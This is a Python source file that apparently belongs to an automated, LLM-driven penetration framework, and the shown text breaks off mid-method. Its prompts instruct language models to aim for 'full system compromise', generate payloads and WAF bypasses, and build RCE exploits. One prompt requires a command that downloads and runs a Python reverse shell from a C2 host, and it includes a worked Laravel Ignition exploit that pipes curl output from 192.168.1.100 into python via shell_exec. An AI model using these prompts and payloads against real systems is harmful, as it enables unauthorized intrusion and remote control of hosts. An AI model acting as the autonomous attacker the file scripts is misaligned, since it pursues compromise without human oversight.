from config import settings
import time
import json
import re
import ollama
import httpx
from abc import ABC, abstractmethod
import signal

# Define a handler for the timeout


def _timeout_handler(signum, frame):
    raise TimeoutError("LLM call timed out")


class BaseLLMProvider(ABC):
    def __init__(self, logger, knowledge_base_path):
        self.logger = logger
        self.knowledge_base_path = knowledge_base_path
        self.knowledge_base = self._load_knowledge_base(knowledge_base_path)

    def _load_knowledge_base(self, path):
        try:
            with open(path, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            self.logger.error(
                f"LLMProvider failed to load knowledge base from {path}: {e}")
            return None

    @abstractmethod
    def generate_next_step(self, context: dict):
        pass

    @abstractmethod
    def suggest_vulnerabilities(self, recon_findings: dict) -> list:
        pass

    @abstractmethod
    def generate_payload(self, vuln_type: str) -> list:
        pass

    @abstractmethod
    def select_exploit_payload(self, findings: dict) -> dict:
        pass

    @abstractmethod
    def suggest_bypass_payload(
            self, original_payload: dict, error_context: str) -> dict:
        pass

    @abstractmethod
    def generate_text(self, prompt: str,
                      context: str = "text_generation") -> str:
        pass

    @abstractmethod
    def analyze_and_hypothesize_exploits(
            self, code_snippets: list, services: dict, http_responses: str) -> list:
        pass

    @abstractmethod
    def generate_exploit_code(self, hypothesis: dict,
                              recon_findings: dict) -> dict:
        pass

    @abstractmethod
    def correct_python_code(self, code: str, error: str) -> str:
        pass

    @abstractmethod
    async def generate_test_sequence(self, test_plan: list, context: dict) -> list:
        pass

    @abstractmethod
    def confirm_hypothesis(self, final_response: dict,
                           hypothesis: dict) -> dict:
        pass


class OllamaProvider(BaseLLMProvider):
    def __init__(self, logger, knowledge_base_path,
                 model='mixtral:latest', timeout_seconds=600):
        super().__init__(logger, knowledge_base_path)
        self.model = model
        # The main timeout is now handled by the client, but we keep a
        # signal-based timeout as a fallback.
        self.signal_timeout = timeout_seconds + 120  # 2 extra minutes
        self.client = ollama.Client(
            host=settings.OLLAMA_HOST, timeout=timeout_seconds)
        self.logger.info(
            f"Ollama LLM Provider initialized with model: {self.model} and client timeout: {timeout_seconds}s")
        signal.signal(signal.SIGALRM, _timeout_handler)

    def _run_with_timeout(self, func, **kwargs):
        retries = 3
        backoff_factor = 5  # Start with a 5-second delay

        for attempt in range(retries):
            try:
                # Use a signal-based alarm as a final fallback safety net
                signal.alarm(self.signal_timeout)

                result = func(**kwargs)

                signal.alarm(0)  # Disable the alarm on success

                if result is None:
                    self.logger.error(
                        f"LLM function call returned None for context: {kwargs.get('messages', [{'content': ''}])[0].get('content', '')[:50]}...")
                    # Do not immediately return, let it retry
                    raise ValueError("LLM function call returned None.")

                return result

            except (TimeoutError, ollama.ResponseError, httpx.ConnectError, ValueError) as e:
                signal.alarm(0)
                delay = backoff_factor * (2 ** attempt)
                self.logger.error(
                    f"LLM call failed on attempt {attempt + 1}/{retries} with error: {e}. Retrying in {delay} seconds...")
                time.sleep(delay)
                continue
            except Exception as e:
                signal.alarm(0)
                delay = backoff_factor * (2 ** attempt)
                self.logger.error(
                    f"An unexpected error occurred during LLM function call on attempt {attempt + 1}/{retries}: {e}. Retrying in {delay} seconds...", exc_info=True)
                time.sleep(delay)
                continue
            finally:
                signal.alarm(0)  # Ensure alarm is always cleared

        self.logger.critical(
            "LLM function call failed after multiple retries.")
        return {"error": "LLM function call failed after multiple retries."}

    def extract_and_parse_json(self, raw_string: str,
                               context: str = "parsing LLM response"):
        self.logger.info(f"Raw LLM response for {context}: {raw_string}")

        # Attempt to find JSON within markdown code blocks first
        json_match = re.search(r"```json\s*(.*?)\s*```", raw_string, re.DOTALL)
        if json_match:
            json_str = json_match.group(1).strip()
        else:
            # If no markdown, find the substring between the first '{' and the
            # last '}'
            try:
                start_index = raw_string.index('{')
                end_index = raw_string.rindex('}') + 1
                json_str = raw_string[start_index:end_index]
            except ValueError:
                self.logger.error(
                    f"Could not find a JSON object (missing '{{' or '}}') in the response for {context}.")
                self.logger.debug(f"Raw string was: {raw_string}")
                return None

        self.logger.debug(
            f"Extracted JSON candidate for {context}: {json_str[:500]}...")

        try:
            return json.loads(json_str)
        except json.JSONDecodeError as e:
            self.logger.error(
                f"Failed to parse extracted JSON string for {context}: {e}")
            self.logger.debug(f"Extracted string was: {json_str}")
            return None

    def generate_next_step(self, context: dict):
        self.logger.info("Ollama LLM is generating the next step...")
        valid_steps = [
            {"agent": "recon", "action": "port_scan",
                "description": "Scan for open ports on the target using Nmap."},
            {"agent": "recon", "action": "web_tech_scan",
                "description": "Identify web technologies on the target using whatweb."},
            {"agent": "recon", "action": "dns_lookup",
                "description": "Perform a DNS lookup to find IP addresses and other DNS records."},
            {"agent": "recon", "action": "subdomain_enumeration",
                "description": "Enumerate subdomains for the target using Subfinder."},
            {"agent": "recon", "action": "whois_lookup",
                "description": "Perform a WHOIS lookup to get domain registration information."},
            {"agent": "recon", "action": "shodan_search",
                "description": "Gather intelligence from Shodan about the target's IP."},
            {"agent": "recon", "action": "censys_search",
                "description": "Gather intelligence from Censys about the target's IP."},
            {"agent": "vulnerability_scanner", "action": "run_scan",
                "description": "Run a vulnerability scan against the target using Nuclei."},
            {"agent": "lfi_attack", "action": "run",
                "description": "Attempt to find and exploit Local File Inclusion (LFI) vulnerabilities."},
            {"agent": "ssrf_attack", "action": "run",
                "description": "Attempt to find and exploit Server-Side Request Forgery (SSRF) vulnerabilities."},
            {"agent": "sqli_attack", "action": "run",
                "description": "Attempt to find and exploit SQL Injection (SQLi) vulnerabilities."},
            {"agent": "exploit", "action": "run",
                "description": "Attempt to exploit a discovered vulnerability based on LLM analysis."},
            {"agent": "post_exploit", "action": "run_tool",
                "description": "Run a post-exploitation tool (e.g., linpeas.sh) on a compromised host."},
            {"agent": "zero_day_hunt", "action": "run",
                "description": "Analyze target and hypothesize potential zero-day vulnerabilities."}
        ]
        prompt = f'''You are an expert penetration tester. Based on the current attack context, generate the next precise, actionable command to exploit the target. The goal is full system compromise.
The output MUST be a single, raw JSON object representing the next step.
You MUST choose a step from the following list of valid actions:
{json.dumps(valid_steps, indent=2)}

CURRENT ATTACK CONTEXT:
{json.dumps(context, indent=2)}

Your response MUST be ONLY the raw JSON object for the next step. Focus on aggressive exploitation, privilege escalation, and achieving remote code execution.
**CRITICAL: You MUST choose an agent and action pair that is explicitly listed in the schema above. Do not invent new actions or assign actions to the wrong agent.**
Example of a valid response: {{"agent": "recon", "action": "port_scan"}}'''
        try:
            response = self._run_with_timeout(func=self.client.chat, model=self.model, messages=[
                                              {'role': 'user', 'content': prompt}], format='json')
            step = self.extract_and_parse_json(
                response['message']['content'], "next step generation")
            if not step:
                raise Exception("Parsed step is null or empty")
            return step
        except Exception as e:
            self.logger.error(f"Failed to generate next step from Ollama: {e}")
            # Fallback to a safe default
            return {"agent": "recon", "action": "port_scan"}

    def suggest_vulnerabilities(self, recon_findings: dict) -> list:
        self.logger.info("Ollama LLM is suggesting vulnerability types...")
        tech_profile = recon_findings.get('tech_profile', {})
        prompt = f'''You are an expert penetration tester. Based on the following technology profile and reconnaissance findings, identify the most critical vulnerabilities to exploit for achieving remote code execution and full system compromise.

Technology Profile:
{json.dumps(tech_profile, indent=2)}

Recon Findings:
{json.dumps(recon_findings, indent=2)}

Your response MUST be ONLY a raw JSON array of strings, or a JSON object where keys are the vulnerability types. Focus on high-impact vulnerabilities that lead to RCE, privilege escalation, or data exfiltration.

Example 1 (JSON Array): ["Laravel RCE", "SQL Injection", "LFI"]
Example 2 (JSON Object): {{"SQL Injection": "High priority", "LFI": "Medium priority"}}
'''
        try:
            response = self._run_with_timeout(func=self.client.chat, model=self.model, messages=[
                                              {'role': 'user', 'content': prompt}], format='json')
            parsed_json = self.extract_and_parse_json(
                response['message']['content'], "vulnerability suggestion")

            if not parsed_json:
                self.logger.error(
                    "Failed to suggest vulnerability types from Ollama: Parsed response is null.")
                return []

            if isinstance(parsed_json, list):
                # If it's already a list of strings, return it.
                return [item for item in parsed_json if isinstance(item, str)]

            if isinstance(parsed_json, dict):
                # If it's a dictionary, return the keys as a list of strings.
                self.logger.info(
                    f"LLM returned a dictionary for suggestions. Extracting keys: {list(parsed_json.keys())}")
                return list(parsed_json.keys())

            self.logger.warning(
                f"LLM returned an unexpected type for vulnerability suggestions: {type(parsed_json)}")
            return []

        except Exception as e:
            self.logger.error(
                f"Failed to suggest vulnerability types from Ollama: {e}", exc_info=True)
            return []

    def generate_payload(self, vuln_type: str) -> list:
        self.logger.info(f"Ollama LLM is generating payload for: {vuln_type}")
        prompt = f'''You are a master penetration tester. Generate a list of payloads for the vulnerability type: {vuln_type}.

Your response MUST be ONLY a raw JSON array of strings.

Example: ["<script>alert('XSS')</script>", "' OR 1=1--"]
'''
        try:
            response = self._run_with_timeout(func=self.client.chat, model=self.model, messages=[
                                              {'role': 'user', 'content': prompt}], format='json')
            parsed_json = self.extract_and_parse_json(
                response['message']['content'], "payload generation")

            if isinstance(parsed_json, dict) and 'payloads' in parsed_json:
                payloads = parsed_json['payloads']
            elif isinstance(parsed_json, list):
                payloads = parsed_json
            else:
                payloads = None

            if not isinstance(payloads, list):
                self.logger.warning(
                    f"Expected a list of payloads but got {type(payloads)}.")
                return []
            return payloads
        except Exception as e:
            self.logger.error(f"Failed to generate payload from Ollama: {e}")
            return []

    def select_exploit_payload(self, findings: dict) -> dict:
        self.logger.info(
            "Ollama LLM is selecting an initial exploit payload...")
        prompt = f"""You are an expert penetration tester. Based on the following reconnaissance findings, select the single most promising initial exploit payload from your knowledge base.

Reconnaissance Findings:
{json.dumps(findings, indent=2)}

Your response MUST be ONLY a raw JSON object with the following keys:
- "payload": The actual payload string.
- "description": A brief description of the payload and why it was chosen.
- "type": The type of vulnerability this payload targets (e.g., "SQL Injection", "XSS").

Example:
{{
  "payload": "1' OR SLEEP(5)--",
  "description": "Time-based blind SQL injection payload to test for delays.",
  "type": "SQL Injection"
}}
"""
        try:
            response = self._run_with_timeout(func=self.client.chat, model=self.model, messages=[
                                              {'role': 'user', 'content': prompt}], format='json')
            payload_data = self.extract_and_parse_json(
                response['message']['content'], "exploit payload selection")
            if not isinstance(payload_data,
                              dict) or "payload" not in payload_data:
                self.logger.warning(
                    f"Expected a dict with 'payload' key for exploit payload selection, but got {type(payload_data)}")
                return None
            return payload_data
        except Exception as e:
            self.logger.error(
                f"Failed to select exploit payload from Ollama: {e}")
            return None

    def suggest_bypass_payload(
            self, original_payload: dict, error_context: str) -> dict:
        self.logger.info("Ollama LLM is suggesting a WAF bypass payload...")
        prompt = f"""You are an expert penetration tester specializing in WAF bypasses. An original exploit payload failed, likely due to WAF detection.

Original Failed Payload:
{json.dumps(original_payload, indent=2)}

Error Context (why it failed):
{error_context}

Your task is to suggest a modified, obfuscated, or alternative payload that is likely to bypass the WAF, while still achieving the original exploit's goal.

Your response MUST be ONLY a raw JSON object with the following keys:
- "payload": The suggested WAF bypass payload string.
- "description": A brief description of the bypass technique used.
- "original_type": The type of vulnerability the original payload targeted.

Example:
{{
  "payload": "1' UNION SELECT SLEEP(5)--",
  "description": "Using UNION-based technique to bypass WAF that blocks 'OR' keyword.",
  "original_type": "SQL Injection"
}}
"""
        try:
            response = self._run_with_timeout(func=self.client.chat, model=self.model, messages=[
                                              {'role': 'user', 'content': prompt}], format='json')
            bypass_data = self.extract_and_parse_json(
                response['message']['content'], "WAF bypass payload suggestion")
            if not isinstance(bypass_data,
                              dict) or "payload" not in bypass_data:
                self.logger.warning(
                    f"Expected a dict with 'payload' key for bypass payload suggestion, but got {type(bypass_data)}")
                return None
            return bypass_data
        except Exception as e:
            self.logger.error(
                f"Failed to suggest bypass payload from Ollama: {e}")
            return None

    def generate_text(self, prompt: str,
                      context: str = "text_generation", options: dict = None):
        self.logger.info(
            f"Ollama LLM is generating text for context: {context}")
        try:
            chat_args = {
                "model": self.model,
                "messages": [{'role': 'user', 'content': prompt}]
            }
            if options:
                chat_args["options"] = options
                self.logger.info(f"Using custom LLM options: {options}")

            # If the prompt expects JSON, explicitly set format='json' for
            # ollama.chat
            if "json object" in prompt.lower() or "json array" in prompt.lower(
            ) or "json format" in prompt.lower():
                chat_args["format"] = "json"
                self.logger.info(
                    f"Explicitly setting ollama.chat format to 'json' for context: {context}")

            # Always get the raw string content first
            response = self._run_with_timeout(
                func=self.client.chat, **chat_args)

            # Check if _run_with_timeout already returned an error
            if isinstance(response, dict) and "error" in response:
                return response  # Propagate the error directly

            if response is None:
                self.logger.error(
                    f"Ollama chat returned None for context: {context}.")
                return {"error": f"Ollama chat returned None.",
                        "raw_response": "None"}

            try:
                raw_content = response.message.content
            except AttributeError as e:
                self.logger.error(
                    f"Ollama chat response object missing expected attribute 'message' or 'content' for context: {context}. Response: {response}")
                return {"error": f"Ollama chat response malformed: Missing {e} attribute.",
                        "raw_response": str(response)}
            except Exception as e:
                self.logger.error(
                    f"An unexpected error occurred accessing Ollama chat response content for context: {context}. Error: {e}. Response: {response}")
                return {"error": f"Failed to access Ollama chat response content: {e}.",
                        "raw_response": str(response)}

            # If the prompt expects JSON, parse it here and return the object.
            if "json object" in prompt.lower() or "json array" in prompt.lower(
            ) or "json format" in prompt.lower():
                self.logger.info(
                    f"JSON output expected for {context}. Parsing response.")
                parsed_json = self.extract_and_parse_json(raw_content, context)
                if parsed_json is None:
                    # Return a structured error if parsing fails
                    return {"error": f"LLM response for {context} was not valid JSON.",
                            "raw_response": raw_content}
                return parsed_json  # Return the parsed dictionary/list

            # Otherwise, return plain text.
            return raw_content.strip()
        except Exception as e:
            self.logger.error(f"Failed to generate text from Ollama: {e}")
            return {"error": f"An exception occurred in LLM call: {e}"}

    def analyze_and_hypothesize_exploits(
            self, tech_profile: dict, services: dict, http_responses: str) -> list:
        self.logger.info(
            "Ollama LLM is analyzing and hypothesizing zero-day exploits based on the technology profile...")
        prompt = f'''You are a world-class cybersecurity researcher with a talent for finding zero-day vulnerabilities. Your specialty is finding novel exploits by analyzing a target's specific technology stack.

Analyze the provided Technology Profile and other data to hypothesize potential, novel exploits. Think outside the box. Consider business logic flaws, race conditions, or creative ways to chain minor issues within this specific stack. Generate hypotheses that are directly related to the identified technologies.

**Technology Profile:**
{json.dumps(tech_profile, indent=2)}

Open Services:
{json.dumps(services, indent=2)}

HTTP Server Responses Snippets:
{http_responses[:2000]}

Based on this data, generate a JSON list of 3-5 creative and plausible zero-day hypotheses. For each hypothesis, provide a name, a detailed description of the logic, and a conceptual plan to test it.

Your response MUST be a raw JSON object or array.

Example (JSON Array):
[
  {{
    "hypothesis_name": "Chained XSS via Outdated jQuery in WordPress",
    "description": "The target uses an old version of jQuery known to have a DOM-based XSS vulnerability. A comment form in WordPress might not properly sanitize input. By crafting a malicious comment, we can trigger the jQuery vulnerability, leading to XSS.",
    "test_plan": "1. Identify the exact jQuery version and its known XSS vulnerability. 2. Find a comment form on the WordPress site. 3. Craft a payload that uses the jQuery vulnerability and inject it into the comment form. 4. Observe if the script executes when the comment is viewed."
  }}
]
'''
        try:
            response = self._run_with_timeout(func=self.client.chat, model=self.model, messages=[
                                              {'role': 'user', 'content': prompt}], format='json')
            parsed_json = self.extract_and_parse_json(
                response['message']['content'], "zero-day hypothesis generation")

            if not parsed_json:
                raise Exception("Parsed JSON is null or empty")

            hypotheses = []
            if isinstance(parsed_json, list):
                # Case 1: LLM returned a direct list of hypotheses
                hypotheses = parsed_json
            elif isinstance(parsed_json, dict):
                if 'hypotheses' in parsed_json and isinstance(
                        parsed_json['hypotheses'], list):
                    # Case 2: LLM returned a dictionary with a 'hypotheses'
                    # list
                    hypotheses = parsed_json['hypotheses']
                else:
                    # Case 3: LLM returned a dictionary of hypotheses, like
                    # {"hypothesis_1": {{...}}}}
                    hypotheses = list(parsed_json.values())
            else:
                raise Exception(
                    f"Unexpected JSON structure received: {type(parsed_json)}")

            if not hypotheses:
                raise Exception("Parsed hypotheses list is null or empty")

            # Basic validation that items in the list are dictionaries
            return [h for h in hypotheses if isinstance(h, dict)]
        except Exception as e:
            self.logger.error(
                f"Failed to generate zero-day hypotheses from Ollama: {e}")
            return []

    def generate_exploit_code(self, hypothesis: dict,
                              recon_findings: dict) -> dict:
        self.logger.info(
            f"Ollama LLM is generating a structured exploit for hypothesis: {hypothesis.get('hypothesis_name')}")
        prompt = f'''You are an expert exploit developer. Your goal is to achieve Remote Code Execution and get a reverse shell.

Based on the hypothesis and reconnaissance data, generate a structured JSON object describing the HTTP request needed to trigger the RCE. The RCE payload MUST be a command that downloads and executes a Python reverse shell from the C2 server.

Hypothesis:
{json.dumps(hypothesis, indent=2)}

Reconnaissance Data (contains C2 host and payload port):
{json.dumps(recon_findings, indent=2)}

Your response MUST be ONLY a raw JSON object with the following keys:
- "http_method": The HTTP method (e.g., "POST").
- "endpoint_path": The full URL for the request.
- "headers": A JSON object of required headers.
- "payload_data": A JSON object representing the data to be sent. The payload MUST be crafted to execute a command on the target.
- "success_condition": A string that, if found in the response body, confirms the RCE was triggered.

**The executed command MUST be a one-liner that downloads and runs a python script, for example: `curl -s http://__C2_HOST__:__C2_PAYLOAD_PORT__/reverse_shell.py | python` or `wget -qO- http://__C2_HOST__:__C2_PAYLOAD_PORT__/reverse_shell.py | python`. You must replace the placeholder host and port with the real values from the Reconnaissance Data.**

Example for a Laravel RCE vulnerability:
{{
  "http_method": "POST",
  "endpoint_path": "https://target.com/_ignition/execute-solution",
  "headers": {{ "Content-Type": "application/json" }},
  "payload_data": {{
    "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
    "parameters": {{
      "variableName": "cmmd",
      "viewFile": "/var/www/html/public/index.php; echo shell_exec('curl -s http://192.168.1.100:8000/reverse_shell.py | python');"
    }}
  }},
  "success_condition": "Solution executed"
}}
'''
        try:
            response = self._run_with_timeout(func=self.client.chat, model=self.model, messages=[
                                              {'role': 'user', 'content': prompt}], format='json')
            exploit_data = self.extract_and_parse_json(
                response['message']['content'], "structured exploit generation")
            if not isinstance(exploit_data, dict):
                self.logger.warning(
                    f"Expected a dict for structured exploit, but got {type(exploit_data)}")
                return None
            return exploit_data
        except Exception as e:
            self.logger.error(
                f"Failed to generate structured exploit from Ollama: {e}")
            return None

    def correct_python_code(self, code: str, error: str) -> str:
        self.logger.info(
            "Ollama LLM is attempting to correct a buggy Python script...")
        prompt = f'''You are an expert Python debugger. The following Python script failed with an error. Your task is to analyze the code and the traceback, fix the bug, and return only the raw, corrected Python code. Do not add any explanations, comments, or markdown.

--- BUGGY CODE ---
```python
{code}
```

--- TRACEBACK ---
```
{error}
```

--- CORRECTED CODE ---
'''
        try:
            response = self._run_with_timeout(func=self.client.chat, model=self.model, messages=[
                                              {'role': 'user', 'content': prompt}])
            corrected_code = response['message']['content'].strip()
            # Clean up the code if it's wrapped in markdown
            if corrected_code.startswith("```python"):
                corrected_code = corrected_code[9:]
            if corrected_code.endswith("```"):
                corrected_code = corrected_code[:-3]
            self.logger.success(
                "LLM generated a corrected version of the script.")
            return corrected_code
        except Exception as e:
            self.logger.error(
                f"Failed to generate corrected code from Ollama: {e}")
            return ""

    async def generate_test_sequence(self, test_plan: list, context: dict) -> list:
        self.logger.info(
            "Ollama LLM is generating a sequence of HTTP requests from a test plan...")
        prompt = f'''You are an automated testing expert. Your job is to convert a natural language test plan into a precise sequence of HTTP requests in JSON format.

        **Test Plan:**
        {json.dumps(test_plan, indent=2)}

        **Current Context (includes target URL, etc.):**
        {json.dumps(context, indent=2)}

        **CRITICAL INSTRUCTIONS:**
        1.  You MUST return ONLY a raw JSON array of request objects.
        2.  Each object in the array represents a single HTTP request.
        3.  Each object MUST have `method` and `url` keys.
        4.  Optional keys are `headers` (object), `params` (object for GET requests), and `data` (object for POST/PUT requests).
        5.  Use the information from the context (like the target URL) to construct the full, absolute URLs.
        6.  Replace placeholders like `<your_token>` or `<user_id>` with sensible, generic values (e.g., "USER_A_TOKEN", 123) if the context doesn't provide them.

        **EXAMPLE OUTPUT:**
        [
          {{
            "method": "POST",
            "url": "http://localhost:8000/api/login",
            "data": {{ "user": "test", "pass": "password" }}
          }},
          {{
            "method": "GET",
            "url": "http://localhost:8000/api/data?id=123",
            "headers": {{ "Authorization": "Bearer <token_from_previous_step>" }}
          }}
        ]
        '''
        try:
            response = self._run_with_timeout(func=self.client.chat, model=self.model, messages=[
                                              {'role': 'user', 'content': prompt}], format='json')
            sequence = self.extract_and_parse_json(
                response['message']['content'], "hypothesis_test_generation")
            if not isinstance(sequence, list):
                self.logger.warning(
                    f"Expected a list for test sequence, but got {type(sequence)}")
                return None
            return sequence
        except Exception as e:
            self.logger.error(
                f"Failed to generate test sequence from Ollama: {e}")
            return None

    def confirm_hypothesis(self, final_response: dict,
                           hypothesis: dict) -> dict:
        self.logger.info(
            "Ollama LLM is analyzing a test result to confirm a hypothesis...")
        prompt = f'''You are a security test analyst. Your job is to determine if a vulnerability test was successful.

        You are given the original **Hypothesis** and the final **HTTP Response** from the test execution.
        Based on the response, did the test confirm the hypothesis?

        **Original Hypothesis:**
        {json.dumps(hypothesis, indent=2)}

        **Final HTTP Response from Test:**
        {json.dumps(final_response, indent=2)}

        **CRITICAL INSTRUCTIONS:**
        1.  Analyze the response (status code, headers, body) in the context of the hypothesis's test plan and expected outcome.
        2.  A 500 error might indicate success if the goal was to crash the server. A 200 OK with unexpected data might confirm an IDOR. A long response time might confirm a time-based attack.
        3.  You MUST return ONLY a raw JSON object with two keys: `"confirmed"` (boolean `true` or `false`) and `"reason"` (a brief string explaining your conclusion).

        **EXAMPLE OUTPUT 1 (Success):**
        {{
          "confirmed": true,
          "reason": "The server responded with a 500 Internal Server Error after receiving the large payload, which aligns with the buffer overflow hypothesis."
        }}

        **EXAMPLE OUTPUT 2 (Failure):**
        {{
          "confirmed": false,
          "reason": "The server responded with a standard 404 Not Found, indicating the endpoint does not exist as hypothesized."
        }}
        '''
        try:
            response = self._run_with_timeout(func=self.client.chat, model=self.model, messages=[
                                              {'role': 'user', 'content': prompt}], format='json')
            confirmation = self.extract_and_parse_json(
                response['message']['content'], "hypothesis_confirmation")
            if not isinstance(confirmation,
                              dict) or 'confirmed' not in confirmation:
                self.logger.warning(
                    f"LLM returned an invalid confirmation object: {confirmation}")
                return {
                    "confirmed": False, "reason": "LLM failed to provide a valid confirmation structure."}
            return confirmation
        except Exception as e:
            self.logger.error(
                f"Failed to get hypothesis confirmation from Ollama: {e}")
            return {"confirmed": False,
                    "reason": f"An exception occurred during confirmation: {e}"}



class VanchinProvider(BaseLLMProvider):
    """Vanchin AI Provider with key rotation and rate limiting"""
    
    def __init__(self, logger, knowledge_base_path, api_url=None, model=None, api_keys=None, max_tokens=150000, rate_limit=20):
        super().__init__(logger, knowledge_base_path)
        self.api_url = api_url or "https://vanchin.streamlake.ai/api/gateway/v1/endpoints/chat/completions"
        self.model = model or "ep-x4jt3z-1761493764663181818"
        
        # Parse API keys
        if isinstance(api_keys, str):
            self.api_keys = [key.strip() for key in api_keys.split(',')]
        elif isinstance(api_keys, list):
            self.api_keys = api_keys
        else:
            self.api_keys = []
        
        self.current_key_index = 0
        self.max_tokens = max_tokens
        self.rate_limit = rate_limit
        self.last_request_time = 0
        self.request_count = 0
        
        self.logger.info(f"VanchinProvider initialized with {len(self.api_keys)} API keys")
    
    def _get_next_api_key(self):
        """Rotate to next API key"""
        if not self.api_keys:
            raise ValueError("No Vanchin API keys configured")
        
        key = self.api_keys[self.current_key_index]
        self.current_key_index = (self.current_key_index + 1) % len(self.api_keys)
        return key
    
    def _rate_limit_check(self):
        """Check and enforce rate limiting"""
        current_time = time.time()
        
        # Reset counter every second
        if current_time - self.last_request_time >= 1.0:
            self.request_count = 0
            self.last_request_time = current_time
        
        # Wait if rate limit exceeded
        if self.request_count >= self.rate_limit:
            sleep_time = 1.0 - (current_time - self.last_request_time)
            if sleep_time > 0:
                time.sleep(sleep_time)
            self.request_count = 0
            self.last_request_time = time.time()
        
        self.request_count += 1
    
    async def _call_vanchin_api(self, messages, max_tokens=None, temperature=0.7):
        """Call Vanchin API with retry logic"""
        self._rate_limit_check()
        
        max_retries = len(self.api_keys)
        last_error = None
        
        for attempt in range(max_retries):
            try:
                api_key = self._get_next_api_key()
                
                headers = {
                    "Authorization": f"Bearer {api_key}",
                    "Content-Type": "application/json"
                }
                
                payload = {
                    "model": self.model,
                    "messages": messages,
                    "max_tokens": max_tokens or self.max_tokens,
                    "temperature": temperature
                }
                
                with httpx.Client(timeout=300.0) as client:
                    response = client.post(self.api_url, json=payload, headers=headers)
                    response.raise_for_status()
                    
                    result = response.json()
                    
                    if 'choices' in result and len(result['choices']) > 0:
                        return result['choices'][0]['message']['content']
                    else:
                        raise ValueError(f"Invalid response format: {result}")
                        
            except Exception as e:
                last_error = e
                self.logger.warning(f"Vanchin API call failed (attempt {attempt + 1}/{max_retries}): {e}")
                
                if attempt < max_retries - 1:
                    time.sleep(1)  # Wait before retry
                    continue
        
        raise Exception(f"All Vanchin API attempts failed. Last error: {last_error}")
    
    async def generate_next_step(self, context: dict):
        """Generate next attack step using Vanchin AI"""
        try:
            prompt = f"""Based on the following attack context, suggest the next step:

Context:
{json.dumps(context, indent=2)}

Provide a JSON response with:
- phase: the attack phase
- action: specific action to take
- reasoning: why this step is recommended
- tools: list of tools needed

Response format: {{"phase": "...", "action": "...", "reasoning": "...", "tools": [...]}}"""

            messages = [
                {"role": "system", "content": "You are an expert penetration testing AI assistant."},
                {"role": "user", "content": prompt}
            ]

            response = await self._call_vanchin_api(messages)
            return self.extract_and_parse_json(response, "next_step")

        except Exception as e:
            self.logger.error(f"Failed to generate next step: {e}")
            return {"phase": "RECONNAISSANCE", "action": "basic_scan", "reasoning": "Fallback to basic scan", "tools": ["nmap"]}
    
    async def suggest_vulnerabilities(self, recon_findings: dict) -> list:
        """Suggest potential vulnerabilities based on reconnaissance findings"""
        try:
            prompt = f"""Analyze these reconnaissance findings and suggest potential vulnerabilities:

Findings:
{json.dumps(recon_findings, indent=2)}

Provide a JSON array of vulnerabilities with:
- type: vulnerability type
- severity: high/medium/low
- description: detailed description
- exploitation_method: how to exploit

Response format: [{{"type": "...", "severity": "...", "description": "...", "exploitation_method": "..."}}, ...]"""

            messages = [
                {"role": "system", "content": "You are an expert vulnerability analyst."},
                {"role": "user", "content": prompt}
            ]

            response = await self._call_vanchin_api(messages)
            vulns = self.extract_and_parse_json(response, "vulnerabilities")

            if isinstance(vulns, list):
                return vulns
            return []

        except Exception as e:
            self.logger.error(f"Failed to suggest vulnerabilities: {e}")
            return []
    
    async def generate_payload(self, vuln_type: str) -> list:
        """Generate exploit payloads for a vulnerability type"""
        try:
            prompt = f"""Generate exploit payloads for {vuln_type} vulnerability.

Provide a JSON array of payloads with:
- payload: the actual payload string
- description: what the payload does
- encoding: encoding method used
- success_indicators: list of strings indicating successful exploitation

Response format: [{{"payload": "...", "description": "...", "encoding": "...", "success_indicators": [...]}}, ...]"""

            messages = [
                {"role": "system", "content": "You are an expert exploit developer."},
                {"role": "user", "content": prompt}
            ]

            response = await self._call_vanchin_api(messages)
            payloads = self.extract_and_parse_json(response, "payloads")

            if isinstance(payloads, list):
                return payloads
            return []

        except Exception as e:
            self.logger.error(f"Failed to generate payload: {e}")
            return []
    
    async def select_exploit_payload(self, findings: dict) -> dict:
        """Select the best exploit payload based on findings"""
        try:
            prompt = f"""Based on these findings, select the best exploit payload:

Findings:
{json.dumps(findings, indent=2)}

Provide a JSON response with:
- payload: the selected payload
- reason: why this payload was chosen
- expected_outcome: what should happen
- fallback_payloads: alternative payloads

Response format: {{"payload": "...", "reason": "...", "expected_outcome": "...", "fallback_payloads": [...]}}"""

            messages = [
                {"role": "system", "content": "You are an expert exploit strategist."},
                {"role": "user", "content": prompt}
            ]

            response = await self._call_vanchin_api(messages)
            return self.extract_and_parse_json(response, "exploit_selection")

        except Exception as e:
            self.logger.error(f"Failed to select exploit payload: {e}")
            return {}
    
    async def suggest_bypass_payload(self, original_payload: dict, error_context: str) -> dict:
        """Suggest bypass payload when original fails"""
        try:
            prompt = f"""The following payload failed. Suggest a bypass:

Original Payload:
{json.dumps(original_payload, indent=2)}

Error Context:
{error_context}

Provide a JSON response with:
- bypass_payload: the new payload
- bypass_technique: technique used
- reasoning: why this should work

Response format: {{"bypass_payload": "...", "bypass_technique": "...", "reasoning": "..."}}"""

            messages = [
                {"role": "system", "content": "You are an expert in WAF bypass and evasion techniques."},
                {"role": "user", "content": prompt}
            ]

            response = await self._call_vanchin_api(messages)
            return self.extract_and_parse_json(response, "bypass")

        except Exception as e:
            self.logger.error(f"Failed to suggest bypass payload: {e}")
            return {}
    
    async def generate_text(self, prompt: str, context: str = "text_generation") -> str:
        """Generate text response"""
        try:
            messages = [
                {"role": "system", "content": f"You are an AI assistant for {context}."},
                {"role": "user", "content": prompt}
            ]

            return await self._call_vanchin_api(messages)

        except Exception as e:
            self.logger.error(f"Failed to generate text: {e}")
            return ""
    
    async def analyze_and_hypothesize_exploits(self, code_snippets: list, services: dict, http_responses: str) -> list:
        """Analyze code and hypothesize potential exploits"""
        try:
            prompt = f"""Analyze the following information and hypothesize potential exploits:

Code Snippets:
{json.dumps(code_snippets, indent=2)}

Services:
{json.dumps(services, indent=2)}

HTTP Responses:
{http_responses}

Provide a JSON array of exploit hypotheses with:
- exploit_type: type of exploit
- confidence: high/medium/low
- target_component: what component to target
- attack_vector: how to attack
- expected_result: what should happen

Response format: [{{"exploit_type": "...", "confidence": "...", "target_component": "...", "attack_vector": "...", "expected_result": "..."}}, ...]"""

            messages = [
                {"role": "system", "content": "You are an expert security researcher and exploit developer."},
                {"role": "user", "content": prompt}
            ]

            response = await self._call_vanchin_api(messages)
            hypotheses = self.extract_and_parse_json(response, "hypotheses")

            if isinstance(hypotheses, list):
                return hypotheses
            return []

        except Exception as e:
